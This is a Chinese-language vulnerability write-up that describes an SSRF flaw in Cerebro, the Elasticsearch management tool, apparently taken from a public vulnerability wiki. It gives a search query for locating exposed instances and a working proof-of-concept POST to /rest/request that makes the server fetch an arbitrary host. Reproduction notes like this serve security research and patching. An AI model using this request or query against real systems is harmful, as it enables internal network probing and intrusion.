---
title: "Cerebro request SSRF漏洞"
date: 2026-10-16 09:07:14
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Cerebro-request"
tags:
  - "Cerebro-request"
  - "SSRF"
  - "漏洞复现"
---
## 漏洞描述

Cerebro是使用Scala、Play Framework、AngularJS和Bootstrap构建的开源的基于Elasticsearch Web可视化管理工具。您可以通过Cerebro对集群进行web可视化管理，如执行rest请求、修改Elasticsearch配置、监控实时的磁盘，集群负载，内存使用率等。其中某功能存在SSRF漏洞，攻击者通过发送特定的请求包可以探测内网信息

## 漏洞影响

```
Cerebro
```

## 网络测绘

```
app="Cerebro"
```

## 漏洞复现

主页面

![image-20220524143249335](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241432380.png)

发送请求包

```
POST /rest/request

{"method":"GET","data":"","path":"robots.txt","host":"https://www.baidu.com"}
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241433022.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Cerebro-request-SSRF%E6%BC%8F%E6%B4%9E.md)
